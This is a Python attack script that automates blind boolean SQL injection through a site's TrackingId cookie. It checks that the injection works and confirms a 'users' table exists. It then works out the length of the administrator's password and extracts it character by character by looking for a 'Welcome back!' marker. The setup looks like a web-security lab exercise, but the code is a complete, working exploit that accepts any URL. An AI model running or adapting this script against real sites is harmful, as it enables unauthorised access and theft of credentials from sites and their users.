#!/usr/bin/python3
#Made by Attila Gillioz
#29.06.2022


import requests
import re
import os
import sys
import string
from pwn import *


url =input('URL : ')
table = 'users'

flag = "Welcome back!"
paramrequest= requests.get(url)
trackingid = paramrequest.cookies.get('TrackingId')
session = paramrequest.cookies.get('session')

username = "administrator" #3input("Enter the name of the user to test : ")

"""
if not os.path.isfile(table):
    print("File does not exist")
    sys.exit(0)
#Need better sql querry

if not os.path.isfile(username):
    print("File does not exist")
    sys.exit(0)
username_found = []
username_data = open(username,'r').read().split("\n")

table_data = open(table,'r').read().split("\n")
"""
table_found = []
password_found = []




######################## FUNCTIONS ########################
dict = list(string.ascii_lowercase + string.digits)

def test_vuln():
    payload = str(trackingid)+"\'AND \'1\'=\'1;"
    cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
    request = requests.get(url, cookies=cookie)
    output = request.text
    if re.search(flag,output):  
        global vuln_fun 
        vuln_fun = True
    else:
        vuln_fun = False


def test_table():
    #for i in table_data:
        payload = str(trackingid)+"\'AND (SELECT \'a\' FROM "+table+" LIMIT 1)=\'a;"
        cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
        request = requests.get(url, cookies=cookie)
        output = request.text
        if re.search(flag,output):
            table_found.append(table)  
            global table_fun 
            table_fun = table
#Need to test better querry
"""
def test_user():
    for x in table_found:
        for i in username_data:
            payload = str(trackingid)+"\' OR exists(SELECT 1  FROM "+x+" where username = \'"+i+"\' limit 1) -- LKbI"
            cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            request = requests.get(url, cookies=cookie)
            output = request.text
            if re.search(flag,output):
                username_found.append(i)  
                print("Found user : " + i)
"""

def test_password_length():
     #for x in table_found:
        for i in range(100):
            payload = str(trackingid)+"\' AND (SELECT \'a\' FROM " + str(table) + " WHERE username=\'"+str(username)+"\' AND LENGTH(password)>"+str(i)+")=\'a;"
            cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            request = requests.get(url, cookies=cookie)
            output = request.text
            if re.search(flag,output):
                pass
            else:
                global password_length 
                password_length = i
                break


def test_password():
    nbr = 0
    #for x in table_found:
    while password_length > nbr:
        for i in dict:
            password = ""
            payload = str(trackingid)+"\' AND (SELECT SUBSTRING(password,"+str(nbr+1)+",1) FROM " +str(table)+" WHERE username=\'administrator\')=\'"+password+str(i)+";"
            cookie = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            request = requests.get(url, cookies=cookie)
            output = request.text
            if re.search(flag,output):
                nbr+=1
                password+=i
                print(password,end='')

                
vuln_log = log.progress('Working')
vuln_log.status('Testing if the site is vulnerable')
test_vuln()
if vuln_fun:
    vuln_log.success(url +' is vulnerable'+'\n')
else:
    vuln_log.failure(url + ' is not vulnerable')
    sys.exit(0)

table_log = log.progress('Working')
table_log.status('Finding tables')
test_table()
table_log.success('Table found : '+table+'\n')

password_length_log = log.progress('Working')
password_length_log.status('Finding the password length')
test_password_length()
password_length_log.success('Password length is : '+str(password_length)+'\n')

password_log = log.progress('Working')
password_log.status('Finding the password')
print('[++] Password is : ',end='')
test_password()


